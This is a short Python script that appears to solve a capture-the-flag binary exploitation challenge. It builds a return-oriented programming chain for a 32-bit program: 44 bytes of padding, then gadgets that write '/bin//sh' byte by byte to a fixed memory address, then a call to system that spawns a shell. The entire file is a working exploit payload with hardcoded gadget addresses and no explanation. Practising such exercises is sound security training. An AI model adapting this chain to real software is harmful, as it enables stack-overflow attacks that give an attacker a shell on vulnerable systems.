#!/usr/bin/python

import struct

writeaddr = 0x804a028;

sh = "/bin//sh"

rop = "A"*44

for x in range(0, 8):
	rop += struct.pack('<I', 0x80483e1)	# pop ebx ; ret
	rop += struct.pack('<I', writeaddr+x)	# first write addr
	rop += struct.pack('<I', 0x8048671)	# xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret
	rop += "BBBB"				# esi filler
	rop += struct.pack('<I', 0x804867b)	# xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret
	rop += "BBBB"				# ebp filler
	rop += struct.pack('<I', 0x8048689)	# xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced ; ret
	rop += "BBBB"				# ebp filler
	rop += struct.pack('<I', 0x8048671)	# xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret
	rop += "BBBB"				# esi filler
	rop += struct.pack('<I', 0x8048693)	# mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret  
	rop += "BBBB"				# epb filler
	rop += struct.pack('<I', ord(sh[x]))	# bl to write



rop += struct.pack('<I', 0x804865a)	# system
rop += struct.pack('<I', writeaddr)	# /bin//sh location

print rop
